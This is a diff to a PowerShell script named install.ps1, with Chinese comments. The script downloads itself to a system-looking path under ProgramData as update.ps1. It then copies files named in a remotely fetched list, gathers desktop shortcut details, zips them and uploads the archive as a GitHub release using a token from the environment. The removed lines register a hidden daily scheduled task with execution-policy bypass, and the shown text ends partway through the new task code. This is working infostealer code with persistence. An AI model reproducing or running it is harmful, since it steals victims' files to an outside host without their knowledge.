@@ -1,34 +1,39 @@
-# install.ps1 - 上传文件 + 注册计划任务（带日志 + 出错暂停）
-$logPath = "C:\upload_log.txt"
+# install.ps1 - 主功能：上传文件 + 注册定时任务
+$script:logPath = "C:\upload_log.txt"
+
 function Log($msg) {
     $line = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $msg
-    $line | Out-File $logPath -Append
+    try {
+        $line | Out-File $script:logPath -Append -Encoding utf8
+    } catch {
+        Write-Host "❌ 日志写入失败: $($_.Exception.Message)"
+    }
     Write-Host $line
 }
+
 Log "===== INSTALL EXECUTED ====="
 
-# 下载自身副本
+# === 下载自身到固定路径（以便任务执行） ===
 $localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
 $remoteUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1"
 
 try {
     Invoke-RestMethod -Uri $remoteUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
-    Log "✔ install.ps1 downloaded to $localPath"
+    Log "[OK] install.ps1 downloaded to $localPath"
 } catch {
     Log "❌ Failed to download install.ps1: $($_.Exception.Message)"
-    Pause
     return
 }
 
-# 获取 GitHub Token
+# === 获取 GitHub Token（从环境变量） ===
 $token = $env:GITHUB_TOKEN
 if (-not $token) {
-    Log "❌ GITHUB_TOKEN 环境变量不存在，终止执行"
-    Pause
+    Log "❌ GITHUB_TOKEN 环境变量不存在，终止执行。"
     return
 }
+Log "[DEBUG] GITHUB_TOKEN detected"
 
-# 上传逻辑
+# === 上传逻辑（文件收集、打包、上传） ===
 try {
     $repo = "drftghy/backup-files"
     $now = Get-Date
@@ -47,7 +52,6 @@ try {
     $pathList = Invoke-RestMethod -Uri $targetListUrl -UseBasicParsing
     $paths = $pathList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
 
-    # 拷贝目标文件
     $i = 0
     foreach ($path in $paths) {
         $i++
@@ -62,11 +66,11 @@ try {
                 Copy-Item $path -Destination $dst -Force
             }
         } catch {
-            Log "⚠ Failed to copy path: $path => $($_.Exception.Message)"
+            Log "⚠️ Failed to copy path: ${path} => $($_.Exception.Message)"
         }
     }
 
-    # 提取桌面快捷方式
+    # 收集桌面快捷方式
     try {
         $desktop = [Environment]::GetFolderPath("Desktop")
         $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
@@ -78,14 +82,12 @@ try {
         }
         $lnkReport | Out-File "$tempRoot\lnk_info.txt" -Encoding utf8
     } catch {
-        Log "⚠ Failed to extract shortcut info: $($_.Exception.Message)"
+        Log "⚠️ Failed to extract .lnk shortcuts: $($_.Exception.Message)"
     }
 
-    # 压缩
     Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force
-    Log "✔ Archive created: $zipPath"
 
-    # 创建 Release
+    # 上传 Release
     $releaseData = @{
         tag_name    = $tag
         name        = $releaseName
@@ -103,7 +105,6 @@ try {
     $releaseResp = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData
     $uploadUrl = $releaseResp.upload_url -replace "{.*}", "?name=$zipName"
 
-    # 上传压缩包
     $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
     $uploadHeaders = @{
         Authorization = "token $token"
@@ -111,34 +112,16 @@ try {
         "User-Agent" = "PowerShell"
     }
     Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes
-
-    Log "✅ Upload completed."
+    Log "[OK] Upload completed."
 } catch {
     Log "❌ Upload failed: $($_.Exception.Message)"
-    Pause
-    return
 }
 
 # 清理
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 
-# 注册计划任务（当前用户）
+# === 注册计划任务，每天 0:00 执行 update.ps1 ===
 try {
     $taskName = "UploaderTask"
-    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
-        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
-        Log "✔ Existing task removed"
-    }
-
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$localPath`""
-    $trigger = New-ScheduledTaskTrigger -Daily -At "00:00"
-    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
-
-    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal
-    Log "✅ Scheduled task registered at 0:00"
-} catch {
-    Log "❌ Failed to register task: $($_.Exception.Message)"
-    Pause
-    return
-}
+    if (Get-ScheduledTask -TaskName
